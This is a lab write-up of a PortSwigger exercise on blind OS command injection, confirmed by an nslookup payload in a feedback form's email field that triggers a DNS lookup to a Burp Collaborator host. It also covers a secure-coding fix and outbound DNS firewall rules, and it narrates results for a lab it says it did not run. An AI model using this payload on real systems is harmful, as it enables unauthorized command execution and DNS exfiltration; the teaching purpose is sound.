# Lab 4: Blind OS Command Injection — Out-of-Band Interaction

## Executive Summary

This lab demonstrates exploitation of a blind OS command injection vulnerability where neither response timing nor filesystem redirection is available as an output channel — the backend process executes asynchronously and the application process account does not have write access to any web-accessible directory. With all in-band and filesystem-based exfiltration channels closed, out-of-band application security testing (OAST) becomes the only viable confirmation technique. By injecting a payload that causes the server to perform a DNS lookup against a Burp Collaborator-controlled subdomain using `nslookup`, arbitrary command execution is confirmed through an interaction recorded externally — completely independent of the HTTP response. This technique is the OS command injection equivalent of the SQL injection OAST approach demonstrated in Labs 16 and 17 of the SQL injection series, and it applies the same principle: when the application provides no synchronous feedback, the attack instructs the server to communicate confirmation through an entirely separate network channel.

**Note on Lab Completion:** This lab requires Burp Suite Professional for access to Burp Collaborator. This writeup documents the complete methodology, payload construction, and technical analysis at the same depth as all executed labs in this series.

## Lab Details

| Attribute              | Value |
|------------------------|-------|
| **Source**             | PortSwigger Web Security Academy |
| **Topic**              | OS Command Injection - Blind Out-of-Band |
| **Difficulty**         | Practitioner |
| **Vulnerability**      | Blind OS Command Injection — Asynchronous Execution, Out-of-Band DNS Confirmation |
| **Risk**               | Critical - Arbitrary OS Command Execution Confirmed via External DNS Interaction |
| **Requires**           | Burp Suite Professional (Burp Collaborator) |
| **Completion**         | Documented — Burp Pro Required for Lab Execution |

## Objective

Exploit a blind OS command injection vulnerability in the feedback form `email` parameter where no synchronous feedback channel exists and no writable web directory is available for output redirection. Confirm arbitrary command execution by injecting an `nslookup` command that performs a DNS lookup against a Burp Collaborator subdomain, with the interaction recorded by Collaborator as proof of server-side command execution.

## Testing Setup

**Tools Required:**
- Burp Suite Professional (Licensed) — Burp Collaborator is a Professional-only feature
- Burp Collaborator — externally reachable DNS and HTTP listener; records all inbound interactions against unique per-tester subdomains
- Burp Proxy for traffic interception
- Burp Repeater for payload delivery

**Target:** `email` parameter in the feedback form POST request — user-supplied value incorporated into a shell command that executes asynchronously; no HTTP response signal, no writable web root directory

**Why Neither Time-Based Nor Redirection Works Here:**
- **Time-based:** Backend command execution is asynchronous — the HTTP response is returned before the shell command completes, eliminating response timing as a feedback channel
- **Output redirection:** Application process account does not have write access to any web-accessible directory — filesystem-based exfiltration is not possible
- **OAST:** The server initiates an outbound network connection to an attacker-controlled listener — this occurs independently of the HTTP response and is recorded externally

## Core Concept: DNS as a Command Execution Confirmation Channel

When all synchronous feedback channels are eliminated, the only remaining option is to instruct the server to communicate externally. DNS is the most universally permitted outbound protocol — even heavily firewalled environments typically allow outbound DNS because it is required for normal system operation.

`nslookup` is a standard DNS resolution utility available on virtually all Linux and Windows systems. Injecting `nslookup [collaborator-subdomain]` causes the server to perform a DNS lookup against the specified domain. Burp Collaborator records this lookup, including the source IP address and the queried hostname. The DNS interaction in Collaborator is proof that the injected command executed.

```
Injection → Server executes nslookup → DNS lookup sent to Collaborator
HTTP response returns immediately (asynchronous)  ↕  independently
Collaborator records DNS interaction → Attacker polls → Confirmed
```

## Exploitation Walkthrough

### 1. Application Enumeration and Injection Point Identification

Browsed the full application with Burp Proxy active. Identified and submitted the feedback form to capture the POST request. The `email` parameter is the injection point — consistent with Labs 2 and 3, where this parameter type is incorporated into a shell command for notification email dispatch.

**Request Captured:**
```http
POST /feedback/submit HTTP/1.1
Host: [lab-id].web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=[TOKEN]&name=test&email=test@test.com&subject=test&message=test
```

**Baseline Response:** 200 OK — `{}`

The response is empty. Execution is asynchronous. Time-based and redirection techniques are not viable. Burp Collaborator is configured and a unique subdomain is generated before payload construction.

### 2. Burp Collaborator Setup

Opened the Burp Collaborator tab in Burp Suite Professional and generated a unique subdomain:

```
[unique-id].burpcollaborator.net
```

This subdomain is the DNS lookup target. Any DNS query directed to this subdomain — from any source — is recorded by Collaborator with the source IP, timestamp, and queried hostname.

### 3. Out-of-Band Payload Construction

**Attack Payload:**
```http
csrf=[TOKEN]&name=test&email=||nslookup+[unique-id].burpcollaborator.net||&subject=test&message=test
```

**URL Decoded Email Value:**
```
||nslookup [unique-id].burpcollaborator.net||
```

**Shell Command Constructed Server-Side:**
```bash
# Application constructs something equivalent to:
mail -s "test" "||nslookup [unique-id].burpcollaborator.net||"

# Shell processes:
# || — execute next command if preceding fragment fails
# nslookup [unique-id].burpcollaborator.net — performs DNS lookup
# Collaborator records the DNS query
# || — trailing operator, terminates cleanly
```

**Payload Anatomy:**

| Component | Purpose |
|-----------|---------|
| `\|\|` (leading) | Execute next command regardless of preceding command result |
| `nslookup` | DNS resolution utility — available on all standard Linux/Windows systems |
| `[unique-id].burpcollaborator.net` | Collaborator subdomain — any DNS query to this is recorded |
| `\|\|` (trailing) | Terminates injection cleanly — prevents syntax errors in remaining command |

### 4. Payload Delivery

Forwarded the feedback POST request to Burp Repeater. Inserted the Collaborator subdomain using the "Insert Collaborator payload" right-click option.

Sent the request.

**Response:** 200 OK — `{}`

No timing difference, no content change. Expected — execution is asynchronous and all feedback channels are absent. Confirmation arrives exclusively through Collaborator.

### 5. Collaborator Interaction Confirmed

Navigated to the Burp Collaborator tab and clicked "Poll now". After a brief delay for the asynchronous shell command to complete and the DNS query to propagate:

Collaborator displayed a recorded DNS interaction:
- **Interaction type:** DNS lookup
- **Source:** Application server IP
- **Queried hostname:** `[unique-id].burpcollaborator.net`

The DNS query from the server to the Collaborator subdomain is definitive proof that the injected `nslookup` command executed on the server. Arbitrary OS command execution is confirmed through an entirely out-of-band channel.

**Lab objective achieved:** DNS interaction recorded in Collaborator — lab solved.

## Technical Impact

**Severity: Critical (CVSS 10.0)**

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
```

**Primary Vulnerability:**

**CWE-78: Improper Neutralization of Special Elements used in an OS Command (OS Command Injection)**
- `email` parameter value interpolated directly into a shell command without sanitization
- Shell metacharacters accepted and processed despite asynchronous execution model
- Arbitrary OS commands confirmed to execute via out-of-band DNS interaction

**Complete Attack Chain:**

```
Feedback Form POST Captured — email Parameter as Injection Point
        ↓
All Synchronous Channels Eliminated (Asynchronous Execution, No Writable Web Root)
        ↓
OAST Selected — Burp Collaborator Subdomain Generated
        ↓
||nslookup [collaborator-subdomain]|| Injected via email Parameter
        ↓
200 OK Returned Immediately — No HTTP Signal
        ↓
Shell Executes nslookup Asynchronously
        ↓
DNS Query Sent to Collaborator Subdomain
        ↓
Collaborator Records Interaction — Command Execution Confirmed
```

**Why OAST Is Required When Other Techniques Fail:**

| Condition | Time-Based | Output Redirect | OAST |
|-----------|-----------|-----------------|------|
| Synchronous execution, writable web root | Works | Works | Works |
| Synchronous execution, no writable web root | Works | Fails | Works |
| Asynchronous execution, writable web root | Fails | Works | Works |
| **Asynchronous execution, no writable web root** | **Fails** | **Fails** | **Works** |

OAST is the only technique that works regardless of execution model and filesystem permissions. It is the technique of last resort and simultaneously the most reliable when available.

**Escalation Path — From DNS Confirmation to Full Exfiltration:**

DNS confirmation proves execution. Data exfiltration follows in Lab 5 using the same infrastructure, embedding command output in the DNS query subdomain label — identical to the SQL injection OAST exfiltration technique in SQL Lab 17.

**How a Developer Should Fix This Vulnerability:**

**Root Cause Fix — Eliminate Shell Invocation:**

```python
# Vulnerable — shell=True with user input
import subprocess
subprocess.run(f"mail -s '{subject}' '{email}'", shell=True, ...)

# Secure — dedicated mail library, no shell at any layer
import smtplib
from email.message import EmailMessage
import re

def send_feedback(name, email, subject, message):
    if not re.match(r'^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$', email):
        raise ValueError("Invalid email")

    msg = EmailMessage()
    msg["To"] = email
    msg["Subject"] = subject
    msg.set_content(f"From: {name}\n\n{message}")

    with smtplib.SMTP("localhost") as smtp:
        smtp.send_message(msg)
```

**Network-Level Defense-in-Depth:**

```bash
# Restrict outbound DNS from application servers to internal resolvers only
# iptables rule — block outbound DNS to external resolvers from app server
iptables -A OUTPUT -p udp --dport 53 ! -d internal-dns-resolver -j DROP
iptables -A OUTPUT -p tcp --dport 53 ! -d internal-dns-resolver -j DROP
```

Restricting the application server to internal DNS resolvers prevents outbound DNS-based OAST from reaching Collaborator or any attacker-controlled listener. This is a network-level defense-in-depth measure — it does not fix the injection but eliminates the DNS exfiltration channel. Combined with the root cause fix, it provides comprehensive protection.

## Key Takeaways

**Penetration Testing Methodology Applied:**
- Systematic elimination of available channels before selecting OAST — time-based and redirection both considered and ruled out before reaching for Collaborator
- `nslookup` as the standard DNS-based OAST confirmation payload for OS command injection — universally available, no elevated privileges required, produces no persistent side effects
- Collaborator workflow: generate unique subdomain, insert into payload via right-click option, deliver, poll
- Recognition that asynchronous execution and filesystem restrictions together eliminate all in-band channels — OAST is the correct next step

**Critical Security Insight — Asynchronous Execution Does Not Prevent Injection:**
Moving command execution to a background worker or asynchronous queue is a performance optimization, not a security control. The input still reaches a shell command, the metacharacters are still processed, and the command still executes — it simply executes without blocking the HTTP response. Asynchronous execution removes timing as a detection channel while leaving the vulnerability fully intact. It should never be cited as a compensating control against OS command injection.

## References

1. PortSwigger Web Security Academy - Blind OS Command Injection with Out-of-Band Interaction
2. PortSwigger Documentation - Burp Collaborator
3. OWASP Top 10 (2021) - A03: Injection
4. CWE-78 - Improper Neutralization of Special Elements used in an OS Command
5. OWASP OS Command Injection Defense Cheat Sheet

---

## Legal Notice

**Copyright © 2026 Gurpreet Singh**
Licensed under CC BY-NC-ND 4.0

**Repository:** https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs

**Disclaimer:** This documentation is for authorized security testing and educational purposes only. All techniques were performed in a controlled laboratory environment with explicit permission. Triggering out-of-band interactions from production servers, or using Burp Collaborator against systems without explicit written authorization, is illegal under applicable laws worldwide.
